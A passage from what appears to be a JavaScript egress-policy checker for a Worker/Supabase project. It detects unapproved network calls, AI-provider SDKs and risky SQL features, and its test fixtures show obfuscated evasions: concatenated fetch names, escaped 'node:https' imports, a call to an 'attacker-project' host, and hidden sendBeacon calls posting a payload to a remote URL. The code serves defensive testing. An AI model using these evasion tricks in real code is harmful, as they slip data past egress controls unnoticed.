        if (tokens[afterParams].value === "(") parentheses += 1;
        else if (tokens[afterParams].value === ")") parentheses -= 1;
      }
      let bodyStart = afterParams;
      while (bodyStart < tokens.length && tokens[bodyStart].value !== "{") bodyStart += 1;
      if (parentheses > 0 || bodyStart >= tokens.length) continue;
      let braceDepth = 1;
      let bodyEnd = bodyStart + 1;
      for (; bodyEnd < tokens.length && braceDepth > 0; bodyEnd += 1) {
        if (tokens[bodyEnd].value === "{") braceDepth += 1;
        else if (tokens[bodyEnd].value === "}") braceDepth -= 1;
      }
      for (let cursor = bodyStart + 1; cursor < bodyEnd - 1; cursor += 1) {
        if (tokens[cursor].value === "function" && tokens[cursor - 1]?.value !== "."
          && (tokens[cursor + 1]?.type === "identifier" || tokens[cursor + 1]?.value === "(")) {
          let nestedParams = cursor + 1;
          while (nestedParams < bodyEnd - 1 && tokens[nestedParams].value !== "(") nestedParams += 1;
          let nestedBody = afterMatching(nestedParams, "(", ")", bodyEnd - 1);
          if (nestedBody === null) continue;
          while (nestedBody < bodyEnd - 1 && tokens[nestedBody].value !== "{") nestedBody += 1;
          const nestedEnd = afterBody(nestedBody, bodyEnd - 1);
          if (nestedEnd === null) continue;
          cursor = nestedEnd - 1;
          continue;
        }
        if (tokens[cursor].value === "=" && tokens[cursor + 1]?.value === ">" && tokens[cursor + 2]?.value === "{") {
          const arrowEnd = afterBody(cursor + 2, bodyEnd - 1);
          if (arrowEnd === null) continue;
          cursor = arrowEnd - 1;
          continue;
        }
        let methodAfterParams = null;
        if (isObjectOrClassBody(cursor) && tokens[cursor].type === "identifier"
          && !["if", "for", "while", "switch", "catch", "with"].includes(tokens[cursor].value)) {
          methodAfterParams = afterMatching(cursor + 1, "(", ")", bodyEnd - 1);
        } else if (isObjectOrClassBody(cursor) && tokens[cursor].value === "[") {
          const afterName = afterMatching(cursor, "[", "]", bodyEnd - 1);
          methodAfterParams = afterName === null ? null : afterMatching(afterName, "(", ")", bodyEnd - 1);
        }
        if (methodAfterParams !== null && tokens[methodAfterParams]?.value === "{") {
          const methodEnd = afterBody(methodAfterParams, bodyEnd - 1);
          if (methodEnd === null) continue;
          cursor = methodEnd - 1;
          continue;
        }
        if (["return", "yield"].includes(tokens[cursor].value) && expressionReferencesCapability(cursor + 1, bodyEnd - 1)
          && !capabilityAliases.has(functionName)) {
          capabilityAliases.add(functionName);
          changed = true;
        }
      }
    }
    for (let index = 0; index < tokens.length - 2; index += 1) {
      if (tokens[index].type !== "identifier" || !isObjectOrClassBody(index)) continue;
      const afterParams = afterMatching(index + 1, "(", ")");
      if (afterParams === null || tokens[afterParams]?.value !== "{") continue;
      const bodyEnd = afterBody(afterParams);
      if (bodyEnd === null || capabilityMethodAliases.has(tokens[index].value)) continue;
      for (let cursor = afterParams + 1; cursor < bodyEnd - 1; cursor += 1) {
        if (tokens[cursor].value === "function" && tokens[cursor - 1]?.value !== "."
          && (tokens[cursor + 1]?.type === "identifier" || tokens[cursor + 1]?.value === "(")) {
          let nestedParams = cursor + 1;
          while (nestedParams < bodyEnd - 1 && tokens[nestedParams].value !== "(") nestedParams += 1;
          let nestedBody = afterMatching(nestedParams, "(", ")", bodyEnd - 1);
          if (nestedBody === null) continue;
          while (nestedBody < bodyEnd - 1 && tokens[nestedBody].value !== "{") nestedBody += 1;
          const nestedEnd = afterBody(nestedBody, bodyEnd - 1);
          if (nestedEnd === null) continue;
          cursor = nestedEnd - 1;
          continue;
        }
        if (tokens[cursor].value === "=" && tokens[cursor + 1]?.value === ">" && tokens[cursor + 2]?.value === "{") {
          const arrowEnd = afterBody(cursor + 2, bodyEnd - 1);
          if (arrowEnd === null) continue;
          cursor = arrowEnd - 1;
          continue;
        }
        let nestedMethodAfterParams = null;
        if (isObjectOrClassBody(cursor) && tokens[cursor].type === "identifier"
          && !["if", "for", "while", "switch", "catch", "with"].includes(tokens[cursor].value)) {
          nestedMethodAfterParams = afterMatching(cursor + 1, "(", ")", bodyEnd - 1);
        } else if (isObjectOrClassBody(cursor) && tokens[cursor].value === "[") {
          const afterName = afterMatching(cursor, "[", "]", bodyEnd - 1);
          nestedMethodAfterParams = afterName === null ? null : afterMatching(afterName, "(", ")", bodyEnd - 1);
        }
        if (nestedMethodAfterParams !== null && tokens[nestedMethodAfterParams]?.value === "{") {
          const nestedMethodEnd = afterBody(nestedMethodAfterParams, bodyEnd - 1);
          if (nestedMethodEnd === null) continue;
          cursor = nestedMethodEnd - 1;
          continue;
        }
        if (["return", "yield"].includes(tokens[cursor].value)
          && expressionReferencesCapability(cursor + 1, bodyEnd - 1)) {
          capabilityMethodAliases.add(tokens[index].value);
          changed = true;
          break;
        }
      }
    }
    for (let index = 0; index < tokens.length - 2; index += 1) {
      const target = tokens[index];
      if (target.type !== "identifier" || capabilityAliases.has(target.value) || tokens[index - 1]?.value === "."
        || tokens[index + 1]?.value !== "=" || tokens[index + 2]?.value === "=") continue;
      if (expressionReferencesCapability(index + 2) || expressionCallsCapabilityMethod(index + 2)) {
        capabilityAliases.add(target.value);
        changed = true;
      }
    }
    for (let index = 0; index < tokens.length; index += 1) {
      const pattern = bindingPattern(index);
      if (!pattern || !expressionReferencesCapability(pattern.end + 1)) continue;
      for (const name of pattern.names) {
        if (!capabilityAliases.has(name)) {
          capabilityAliases.add(name);
          changed = true;
        }
      }
    }
  }
  return tokens.some((token, index) => token.type === "identifier" && capabilityAliases.has(token.value)
    && (tokens[index + 1]?.value === "["
      || (tokens[index + 1]?.value === "?" && tokens[index + 2]?.value === "." && tokens[index + 3]?.value === "[")));
}

function hasAiRuntimeBoundary(content, path = "") {
  const normalizedPath = path.toLowerCase();
  let normalizedContent = content
    .replace(/\\(?:\r\n|[\n\r\u2028\u2029])/g, "")
    .replace(/\\u\{([0-9a-f]{1,6})\}|\\u([0-9a-f]{4})/gi, (_match, braced, fixed) => String.fromCodePoint(Number.parseInt(braced ?? fixed, 16)))
    .replace(/\\x([0-9a-f]{2})/gi, (_match, hex) => String.fromCodePoint(Number.parseInt(hex, 16)))
    .replace(/\\([:/\.@_-])/g, "$1")
    .replace(/\\([a-z_$])/gi, (match, escaped) => /[nrtbfvux]/i.test(escaped) ? match : escaped);
  let previousNormalizedContent;
  do {
    previousNormalizedContent = normalizedContent;
    normalizedContent = normalizedContent.replace(/(["'`])([^"'`\\$]*)\1\s*\+\s*(["'`])([^"'`\\$]*)\3/g, (_match, quote, left, _rightQuote, right) => `${quote}${left}${right}${quote}`);
  } while (normalizedContent !== previousNormalizedContent);
  const sqlLexicalContent = normalizedPath.endsWith(".sql") ? stripSqlComments(normalizedContent) : normalizedContent;
  const capabilityContent = normalizedPath.endsWith(".sql")
    ? sqlLexicalContent.replace(/"([a-z_][a-z0-9_$]*)"/gi, "$1")
    : normalizedContent;
  const sqlTokens = normalizedPath.endsWith(".sql") ? sqlIdentifierTokens(sqlLexicalContent) : [];
  const sqlStructure = normalizedPath.endsWith(".sql") ? sqlStructuralTokens(sqlLexicalContent) : [];
  const sqlClauseStructure = normalizedPath.endsWith(".sql") ? sqlStructuralTokens(sqlLexicalContent, false) : [];
  const hasDynamicSqlExecute = sqlTokens.some((token, index) => token === "execute"
    && !["grant", "revoke"].includes(sqlTokens[index - 1])
    && !["function", "procedure"].includes(sqlTokens[index + 1]));
  const hasSqlOutboundToken = sqlTokens.some((token) => ["pg_net", "http", "http_get", "http_post", "http_put", "http_delete", "http_head", "http_request"].includes(token));
  const hasSqlUnicodeEscapedIdentifier = normalizedPath.endsWith(".sql") && /\bU&"/i.test(sqlLexicalContent);
  const hasSqlUnicodeEscapedString = normalizedPath.endsWith(".sql") && /\bU&'/i.test(sqlLexicalContent);
  const hasSqlNumericEscape = normalizedPath.endsWith(".sql") && /\\(?:[0-7]{1,3}|x[0-9a-f]+|u[0-9a-f]{4}|U[0-9a-f]{8})/i.test(content);
  const hasLegacySqlBackslashEscapes = normalizedPath.endsWith(".sql") && hasSqlFalseGucSetting(sqlLexicalContent);
  const hasUnapprovedSqlSetConfig = normalizedPath.endsWith(".sql") && hasUnapprovedSqlSetConfigCall(sqlLexicalContent);
  const hasPgSettingsReference = normalizedPath.endsWith(".sql")
    && (sqlTokens.some((token) => ["pg_settings", "quoted:pg_settings"].includes(token))
      || sqlStructure.some((token) => token.type === "identifier" && ["pg_settings", "quoted:pg_settings"].includes(token.value)));
  const hasPgLanguageReference = normalizedPath.endsWith(".sql")
    && (sqlTokens.some((token) => ["pg_language", "quoted:pg_language"].includes(token))
      || sqlStructure.some((token) => token.type === "identifier" && ["pg_language", "quoted:pg_language"].includes(token.value)));
  const hasSqlSchedulingCapability = normalizedPath.endsWith(".sql") && (
    sqlTokens.some((token) => ["pg_cron", "quoted:pg_cron"].includes(token))
    || sqlTokens.some((token) => ["cron", "quoted:cron"].includes(token))
    || sqlTokens.some((token) => ["schedule", "quoted:schedule", "schedule_in_database", "quoted:schedule_in_database", "unschedule", "quoted:unschedule", "alter_job", "quoted:alter_job"].includes(token))
    || sqlStructure.some((token) => token.type === "string" && token.value.toLowerCase() === "cron")
  );
  const hasExternalDatabaseCapability = normalizedPath.endsWith(".sql") && (
    sqlTokens.some((token) => {
      const identifier = token.replace(/^quoted:/, "");
      return identifier.startsWith("dblink") || identifier.startsWith("postgres_fdw");
    })
    || sqlStructure.some((token) => token.type === "string"
      && /(?:dblink|postgres_fdw)/i.test(token.value))
  );
  const sqlStatements = [];
  let sqlStatement = [];
  for (const token of sqlStructure) {
    if (token.type === "symbol" && token.value === ";") {
      sqlStatements.push(sqlStatement);
      sqlStatement = [];
    } else sqlStatement.push(token);
  }
  if (sqlStatement.length > 0) sqlStatements.push(sqlStatement);
  const hasSqlServerProgramCapability = sqlStatements.some((statement) => {
    let parenthesisDepth = 0;
    let insideCopy = false;
    for (let index = 0; index < statement.length; index += 1) {
      const token = statement[index];
      if (token.type === "symbol" && token.value === "(") { parenthesisDepth += 1; continue; }
      if (token.type === "symbol" && token.value === ")") { parenthesisDepth = Math.max(0, parenthesisDepth - 1); continue; }
      if (parenthesisDepth !== 0 || token.type !== "identifier") continue;
      if (token.value === "copy") { insideCopy = true; continue; }
      if (!insideCopy || !["from", "to"].includes(token.value)) continue;
      const next = statement[index + 1];
      if (next?.type === "identifier" && next.value === "program") return true;
    }
    return false;
  });
  const approvedSqlLanguages = new Set(["sql", "plpgsql"]);
  const sqlClauseStatements = [];
  let sqlClauseStatement = [];
  for (const token of sqlClauseStructure) {
    if (token.type === "symbol" && token.value === ";") {
      sqlClauseStatements.push(sqlClauseStatement);
      sqlClauseStatement = [];
    } else sqlClauseStatement.push(token);
  }
  if (sqlClauseStatement.length > 0) sqlClauseStatements.push(sqlClauseStatement);
  const hasUnapprovedLanguageClause = sqlClauseStatements.some((statement) => {
    const identifiers = statement.filter((token) => token.type === "identifier").map((token) => token.value.replace(/^quoted:/, ""));
    const isFunctionDefinition = identifiers[0] === "create"
      && (identifiers[1] === "function" || identifiers[1] === "procedure"
        || (identifiers[1] === "or" && identifiers[2] === "replace" && ["function", "procedure"].includes(identifiers[3])));
    const isDoStatement = identifiers[0] === "do";
    if (!isFunctionDefinition && !isDoStatement) return false;
    return statement.some((token, index) => {
      if (token.type !== "identifier" || token.value !== "language") return false;
      const next = statement[index + 1];
      if (!next || !["identifier", "string"].includes(next.type)) return true;
      const rawLanguage = next.value;
      const languageName = rawLanguage.startsWith("language:") ? rawLanguage.slice("language:".length) : rawLanguage.replace(/^quoted:/, "");
      return !approvedSqlLanguages.has(languageName);
    });
  });
  const hasSqlLanguageDefinition = sqlStatements.some((statement) => {
    const blockStatementPrefixes = new Set(["as", "begin", "then", "else", "loop"]);
    const identifierAt = (index) => statement[index]?.type === "identifier" ? statement[index].value : null;
    return statement.some((token, index) => {
      if (token.type !== "identifier" || !["create", "alter", "drop"].includes(token.value)) return false;
      const previous = statement[index - 1];
      const atStatementStart = index === 0
        || (previous?.type === "identifier" && blockStatementPrefixes.has(previous.value));
      if (!atStatementStart) return false;
      let cursor = index + 1;
      if (identifierAt(cursor) === "or" && identifierAt(cursor + 1) === "replace") cursor += 2;
      while (["trusted", "procedural"].includes(identifierAt(cursor))) cursor += 1;
      return identifierAt(cursor) === "language";
    });
  });
  const hasUnapprovedProceduralLanguage = normalizedPath.endsWith(".sql") && (
    hasUnapprovedLanguageClause
    || sqlTokens.some((token) => token.replace(/^quoted:/, "").startsWith("spi_"))
    || hasSqlLanguageDefinition
  );
  const hasAdjacentSqlStrings = normalizedPath.endsWith(".sql") && /(?:^|[\s(])(?:E|U&)?'(?:[^']|'')*'\s*(?:\r?\n|\r)[ \t]*(?:E|U&)?'/im.test(sqlLexicalContent);
  const approvedEgressHosts = new Set([
    "api.github.com",
    "discord.com",
    "spjowmulvoyxxkfeyjkr.supabase.co",
    "www.meccha-iiyatsu.com",
    "meccha-manual.meccha-iiyatsu.com",
    "meccha-manual.tattoo-studio-crm.workers.dev"
  ]);
  const literalUrls = normalizedContent.match(/https?:\/\/[^\s'"`<>)]+/gi) ?? [];
  const hasUnapprovedLiteralEgress = literalUrls.some((literal) => {
    try {
      const parsed = new URL(literal.replace(/\$\{.*$/, ""));
      const host = parsed.hostname.toLowerCase();
      return parsed.protocol !== "https:" || !approvedEgressHosts.has(host);
    } catch {
      return true;
    }
  });
  const directFetchArguments = [...content.matchAll(/(?<![.\w])fetch\s*\(\s*([^,\n)]+)/g)].map((match) => match[1].trim());
  const approvedDirectFetchArguments = new Set([
    "`${config.url}${path}`",
    "request: Request",
    "`https://api.github.com/repos/${owner}/${repo}/issues`",
    "`https://api.github.com${path}`",
    "`https://discord.com/api/v10/webhooks/${interaction.application_id}/${interaction.token}/messages/@original`"
  ]);
  const isApprovedDirectFetchArgument = (argument) => {
    if (argument === "request: Request") return true;
    const expectedCounts = {
      "apps/worker/src/index.ts": new Map([
        ["`${config.url}${path}`", 1],
        ["`https://api.github.com/repos/${owner}/${repo}/issues`", 1],
        ["`https://api.github.com${path}`", 1],
        ["`https://discord.com/api/v10/webhooks/${interaction.application_id}/${interaction.token}/messages/@original`", 1]
      ]),
      "apps/worker/src/manual-router.ts": new Map([["`${config.url}${path}`", 1]]),
      "apps/worker/src/app-assets.ts": new Map([["path", 1]])
    };
    const expected = expectedCounts[path]?.get(argument);
    return expected !== undefined && directFetchArguments.filter((candidate) => candidate === argument).length === expected;
  };
  const hasUnapprovedDirectFetch = directFetchArguments.some((argument) =>
    !isApprovedDirectFetchArgument(argument)
  );
  const configInitializers = [...content.matchAll(/\bconst\s+config\s*=\s*([^;\n]+)/g)].map((match) => match[1].trim());
  const approvedConfigInitializers = {
    "apps/worker/src/index.ts": ["inspectSupabaseConfig(env).config", "ensureSupabaseConfig(env)"],
    "apps/worker/src/manual-router.ts": ["inspectSupabaseConfig(env).config", "ensureConfig(env)"]
  };
  const expectedConfigInitializers = approvedConfigInitializers[path];
  const usesApprovedConfigFetch = directFetchArguments.includes("`${config.url}${path}`");
  const hasUnapprovedConfigOrigin = usesApprovedConfigFetch && (
    !expectedConfigInitializers
    || configInitializers.length !== expectedConfigInitializers.length
    || configInitializers.some((initializer, index) => initializer !== expectedConfigInitializers[index])
  );
  const memberFetchReceivers = [...content.matchAll(/\b([A-Za-z_$][\w$]*)\.fetch\s*\(/g)].map((match) => match[1]);
  const hasUnapprovedMemberFetch = memberFetchReceivers.some((receiver) => receiver !== "phase1Worker")
    || (memberFetchReceivers.includes("phase1Worker") && (path !== "apps/worker/src/index-phase2.ts" || memberFetchReceivers.filter((receiver) => receiver === "phase1Worker").length !== 1));
  const hasFetchAlias = /(?:=|:)\s*(?:globalThis\.)?fetch\b(?!\s*\()/m.test(content);
  let fetchCapabilityRemainder = normalizedContent
    .replace(/\basync\s+fetch\s*\(/g, "(");
  if (path === "apps/worker/src/index-phase2.ts") fetchCapabilityRemainder = fetchCapabilityRemainder.replace(/\bphase1Worker\.fetch\s*\(/g, "(");
  if (["apps/worker/src/index.ts", "apps/worker/src/manual-router.ts"].includes(path)) fetchCapabilityRemainder = fetchCapabilityRemainder.replace(/\bfetch\s*\(\s*`\$\{config\.url\}\$\{path\}`/g, "(");
  if (path === "apps/worker/src/index.ts") fetchCapabilityRemainder = fetchCapabilityRemainder
    .replace(/\bfetch\s*\(\s*`https:\/\/api\.github\.com\/repos\/\$\{owner\}\/\$\{repo\}\/issues`/g, "(")
    .replace(/\bfetch\s*\(\s*`https:\/\/api\.github\.com\$\{path\}`/g, "(")
    .replace(/\bfetch\s*\(\s*`https:\/\/discord\.com\/api\/v10\/webhooks\/\$\{interaction\.application_id\}\/\$\{interaction\.token\}\/messages\/@original`/g, "(");
  if (path === "apps/worker/src/app-assets.ts") fetchCapabilityRemainder = fetchCapabilityRemainder.replace(/\bfetch\s*\(\s*path/g, "(");
  const hasFetchCapabilityEscape = /\bfetch\b|["']fetch["']/.test(fetchCapabilityRemainder);
  const hasDynamicCapabilityLookup = /\b(?:globalThis|Reflect|eval|Function)\b|\b(?:self|window|navigator)\s*\[/.test(normalizedContent)
    || hasComputedCapabilityBinding(normalizedContent)
    || hasAliasedComputedCapabilityLookup(normalizedContent);
  const domSinkRemainder = normalizedContent.replace(/\bnew\s+URL\s*\(/g, "(");
  const domSinkPinnedFiles = new Set(["apps/worker/src/app-assets.ts", "apps/worker/src/index.ts"]);
  const hasUnapprovedHtmlActiveContent = normalizedPath.endsWith(".html")
    && hasUnapprovedHtmlEgress(normalizedContent, approvedEgressHosts);
  const hasUnapprovedDomSink = !domSinkPinnedFiles.has(path)
    && !path.endsWith(".html")
    && (/\b(?:document|DOMParser|Image|location|open)\b|\.(?:submit|requestSubmit)\s*\(|\btext\/html\b/i.test(domSinkRemainder)
      || /<\s*(?:img|iframe|frame|script|link|audio|video|source|track|form|object|embed|meta|base|image|use|style)\b|\bstyle\s*=|\burl\s*\(|@import\b/i.test(domSinkRemainder));
  const hasUnapprovedOutboundCapability = (
    /["'`](?:cloudflare:sockets|node:(?:http|https|http2|net|tls|dgram|dns)|(?:http|https|http2|net|tls|dgram|dns))["'`]/.test(normalizedContent)
    || /\b(?:WebSocket|WebTransport|RTCPeerConnection|EventSource|XMLHttpRequest|sendBeacon)\b/.test(normalizedContent)
    || hasUnapprovedDomSink
    || /\b(?:import|require)\s*\(/.test(normalizedContent)
    || /\bResponse\.redirect\s*\(/.test(normalizedContent)
    || /\bpg_net\b|\bnet\s*\.\s*http_(?:get|post|delete|head)\b|\bsupabase_functions\s*\.\s*http_request\b|\bextensions\s*\.\s*http(?:_(?:get|post|put|delete|head))?\b|\bhttp(?:_(?:get|post|put|delete|head))?\s*\(/i.test(capabilityContent)
    || hasUnapprovedHtmlActiveContent
    || hasDynamicSqlExecute || hasSqlOutboundToken || hasSqlUnicodeEscapedIdentifier || hasSqlUnicodeEscapedString || hasSqlNumericEscape || hasLegacySqlBackslashEscapes || hasUnapprovedSqlSetConfig || hasPgSettingsReference || hasPgLanguageReference || hasSqlSchedulingCapability || hasExternalDatabaseCapability || hasSqlServerProgramCapability || hasUnapprovedProceduralLanguage || hasAdjacentSqlStrings
  );
  return (
    hasUnapprovedLiteralEgress || hasUnapprovedDirectFetch || hasUnapprovedConfigOrigin || hasUnapprovedMemberFetch || hasFetchAlias || hasFetchCapabilityEscape || hasDynamicCapabilityLookup || hasUnapprovedOutboundCapability ||
    /(?:OPENAI|ANTHROPIC|GEMINI|COHERE|MISTRAL)_API_KEY|AI_PROVIDER_API_KEY|ai\.assistiveGeneration/i.test(content) ||
    /(?:api\.openai\.com|[a-z0-9.-]+\.openai\.azure\.com|api\.anthropic\.com|generativelanguage\.googleapis\.com|bedrock-runtime\.[a-z0-9-]+\.(?:amazonaws\.com|api\.aws))/i.test(content) ||
    /\/(?:api\/)?v?\d*\/?(?:ai|generate|completions?|chat)(?:\/|\b)/i.test(content) ||
    /(?:from\s+|require\s*\(\s*|import\s*\(\s*)['"](?:openai|@anthropic-ai\/sdk|@google\/generative-ai|cohere-ai|@mistralai\/mistralai|@aws-sdk\/client-bedrock-runtime)['"]/i.test(content) ||
    /["'](?:openai|@anthropic-ai\/sdk|@google\/generative-ai|cohere-ai|@mistralai\/mistralai|@aws-sdk\/client-bedrock-runtime)["']\s*:/i.test(content) ||
    /(?:^|[\/\-_.])(?:ai[-_.]?adapter|openai|anthropic|gemini|llm)(?:[\/\-_.]|$)/i.test(normalizedPath)
  );
}

for (const fixture of [
  { content: 'import OpenAI from "openai";', path: "apps/worker/src/generator.ts" },
  { content: 'router.post("/v1/chat", handler);', path: "apps/worker/src/routes.ts" },
  { content: 'const client = require("@anthropic-ai/sdk");', path: "apps/worker/src/provider.ts" },
  { content: 'const sdk = await import("openai");', path: "apps/worker/src/provider.ts" },
  { content: '{ "dependencies": { "openai": "1.0.0" } }', path: "package.json" },
  { content: 'const sdk = await import("cohere-ai");', path: "apps/worker/src/provider.ts" },
  { content: '{ "dependencies": { "@mistralai/mistralai": "1.0.0" } }', path: "package.json" },
  { content: '{ "dependencies": { "@aws-sdk/client-bedrock-runtime": "1.0.0" } }', path: "package.json" },
  { content: 'await fetch("https://acme.openai.azure.com/openai/deployments/manual/responses");', path: "apps/worker/src/provider.ts" },
  { content: 'await fetch("https://bedrock-runtime.ap-northeast-1.amazonaws.com/model/example/invoke");', path: "apps/worker/src/provider.ts" },
  { content: 'await fetch("https://bedrock-runtime.ap-northeast-1.api.aws/model/example/invoke");', path: "apps/worker/src/provider.ts" },
  { content: 'await fetch("https://api.groq.com/openai/v1/responses");', path: "apps/worker/src/provider.ts" },
  { content: 'await fetch("https://aiplatform.googleapis.com/v1/projects/example/locations/us-central1/publishers/google/models/gemini:generateContent");', path: "apps/worker/src/provider.ts" },
  { content: 'await fetch("https://unapproved-ai-proxy.workers.dev/v1/responses");', path: "apps/worker/src/provider.ts" },
  { content: 'await fetch("http://unapproved-ai-proxy.workers.dev/v1/responses");', path: "apps/worker/src/provider.ts" },
  { content: 'await fetch("https://attacker-project.supabase.co/functions/v1/ai-proxy");', path: "apps/worker/src/provider.ts" },
  { content: 'await fetch("https:" + "//api.groq.com/openai/v1/responses");', path: "apps/worker/src/provider.ts" },
  { content: 'await globalThis.fetch("https:" + "//api.groq.com/openai/v1/responses");', path: "apps/worker/src/provider.ts" },
  { content: 'const externalFetch = fetch; await externalFetch(dynamicUrl);', path: "apps/worker/src/provider.ts" },
  { content: 'await globalThis["fetch"]("https:" + "//api.groq.com/openai/v1/responses");', path: "apps/worker/src/provider.ts" },
  { content: 'const { fetch: externalFetch } = globalThis; await externalFetch(dynamicUrl);', path: "apps/worker/src/provider.ts" },
  { content: 'const externalFetch = Reflect.get(globalThis, "fet" + "ch"); await externalFetch("https:" + "//api.groq.com/openai/v1/responses");', path: "apps/worker/src/provider.ts" },
  { content: 'const externalFetch = self["fet" + `ch`]; await externalFetch("https:" + `//api.groq.com/openai/v1/responses`);', path: "apps/worker/src/provider.ts" },
  { content: 'import { connect } from "cloudflare:sockets"; connect({ hostname: env.REMOTE_HOST, port: 443 }, { secureTransport: "on" });', path: "apps/worker/src/provider.ts" },
  { content: 'import "cloudflare\\x3asockets";', path: "apps/worker/src/provider.ts" },
  { content: 'import https from "node\\:https";', path: "apps/worker/src/provider.ts" },
  { content: 'import https from "node:\\https";', path: "apps/worker/src/provider.ts" },
  { content: 'import "node:h' + "\\" + '\n' + 'ttps";', path: "apps/worker/src/provider.ts" },
  { content: 'import "node:h' + "\\" + '\u2028' + 'ttps";', path: "apps/worker/src/provider.ts" },
  { content: 'import https from "node:https"; https.request({ hostname: env.REMOTE_HOST });', path: "apps/worker/src/provider.ts" },
  { content: 'const socket = new WebSocket(env.REMOTE_URL);', path: "apps/worker/src/provider.ts" },
  { content: 'navigator["sendBeacon"](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'navigator?.sendBeacon(env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'const { sendBeacon } = navigator; sendBeacon(env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'Navigator.prototype.sendBeacon.call(navigator, env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'const key = ["send", "Beacon"].join(""); const { [key]: transmit } = navigator; transmit.call(navigator, env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'const keys = [["send", "Beacon"].join("")]; const { [keys[0]]: transmit } = navigator; transmit.call(navigator, env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'const keys = [["send", "Beacon"].join("")]; const { [keys[0]]: transmit } = ((navigator)); transmit.call(navigator, env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'const key = ["send", "Beacon"].join(""); const { [key]: transmit } = (null, navigator); transmit.call(navigator, env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'const nav = (null, navigator); const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'const [nav] = [navigator]; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'if (enabled) [nav] = [navigator]; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'function getNavigator() { return navigator; } const nav = getNavigator(); const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'function getNavigator({ value }) { return navigator; } const nav = getNavigator({}); const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'function getNavigator(options = {}) { return navigator; } const nav = getNavigator(); const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'function* getNavigator() { yield navigator; } const nav = getNavigator().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'class Source { static *getNavigator() { yield navigator; } } const nav = Source.getNavigator().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'class Source { static *getNavigator() { yield navigator; } } const nav = Source.getNavigator?.().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'class Source { static *getNavigator() { yield navigator; } } const nav = (Source.getNavigator)?.().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'class Source { static *getNavigator() { yield navigator; } } const nav = (Source.getNavigator as any)?.().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'class Source { static *getNavigator() { yield navigator; } } const nav = ((Source.getNavigator as any))?.().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'class Source { static *getNavigator() { yield navigator; } } const nav = ((Source.getNavigator as any)!)?.().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'class Source { static *getNavigator() { yield navigator; } } const nav = ((Source.getNavigator!) as any)?.().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'class Source { static *getNavigator() { yield navigator; } } async function run() { const nav = await (Source.getNavigator)?.().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload); }', path: "apps/worker/src/provider.ts" },
  { content: 'class Source { static *getNavigator() { yield navigator; } } const nav = ((Source.getNavigator) as { (): any })?.().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'class Source { static *getNavigator() { yield navigator; } } const nav = Source.getNavigator!?.().next().value; const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'class Source { static getNavigator(flag) { const helper = { function: null }; if (flag) { return navigator; } return null; } } const nav = Source.getNavigator(true); const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'function getNavigator(flag) { logger.function(); if (flag) { return navigator; } return null; } const nav = getNavigator(true); const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'function getNavigator() { logger()\n{ return navigator; } } const nav = getNavigator(); const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'function getNavigator() { label: { logger()\n{ return navigator; } } } const nav = getNavigator(); const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'function getNavigator(obj) { obj?.value\nlabel: { logger()\n{ return navigator; } } } const nav = getNavigator({}); const key = ["send", "Beacon"].join(""); nav[key](env.REMOTE_URL, payload);', path: "apps/worker/src/provider.ts" },
  { content: 'const form = document.createElement("form"); form.action = env.REMOTE_URL; form.submit();', path: "apps/worker/src/provider.ts" },
  { content: 'const image = new Image(); image.src = env.REMOTE_URL;', path: "apps/worker/src/provider.ts" },
  { content: 'location.href = ["https:", "//api.groq.com/openai/v1/responses"].join("");', path: "apps/worker/src/provider.ts" },
  { content: 'open(env.REMOTE_URL); location["href"] = env.REMOTE_URL;', path: "apps/worker/src/provider.ts" },
  { content: 'const navigate = open; navigate(env.REMOTE_URL);', path: "apps/worker/src/provider.ts" },
